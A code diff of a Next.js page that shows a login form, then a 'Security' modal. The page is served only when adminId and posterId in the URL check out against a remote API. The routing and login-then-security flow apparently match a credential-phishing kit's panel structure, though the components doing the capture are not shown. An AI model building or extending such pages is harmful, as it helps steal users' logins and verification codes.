@@ -1,16 +1,46 @@
+import { motion } from "framer-motion";
+import { useState } from "react";
+import Footer from "../../../components/Footer";
+import Header from "../../../components/Header";
+import Login from "../../../components/Login";
+import Security from "../../../components/Security";
+import { API_URL, site } from "../../../config";
+import useMockLogin from "../../../hooks/useMockLogin";
 
-import Home from "@/app/components/Home";
-import { site,API_URL } from "../../../config/index";
-import { headers } from 'next/headers'
+export default function Home() {
+  const [showModal, setShowModal] = useState(false);
 
+  const { login } = useMockLogin({ setShowModal });
 
-export default async function Verify({params}) {
-  const { adminId, posterId, verifyId } = params;
-  console.log(adminId,posterId,verifyId)
-  const headersList = headers()
-  let content;
-  const userAgent = headersList.get("user-agent")
-  console.log(userAgent)
+  return (
+    <>
+      {!showModal && (
+        <>
+          <Header />
+          <Login login={login} />
+          <Footer />
+        </>
+      )}
+
+      {showModal && (
+        <motion.div
+          initial={{ opacity: 0 }}
+          animate={{ opacity: 1 }}
+          transition={{ duration: 0.3 }}
+        >
+          <Security setShowModal={setShowModal} />
+        </motion.div>
+      )}
+    </>
+  );
+}
+
+export async function getServerSideProps({
+  req,
+  query: { adminId, posterId },
+}) {
+  const userAgent = req.headers["user-agent"];
+
   const isMobileView = userAgent.match(
     /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
   );
@@ -25,21 +55,17 @@ export default async function Verify({params}) {
 
   const res = await fetch(url);
   const data = await res.json();
-  console.log(data)
+
+  console.log("data", data);
+
   if (data?.success !== "exists") {
-    
-      content= <div className="col-span-12">No Page found!!</div>
-    
+    return {
+      notFound: true,
+    };
   }
-  if (data?.success == "exists") {
-    // content= <div className="col-span-12">Page found!!</div>
-    
-      content= <Home adminId={adminId} posterId={posterId }/>
-    
-  }
-  return (
-    <div>
-     {content}
-    </div>
-  )
+
+  return {
+    props: {},
+  };
 }
+
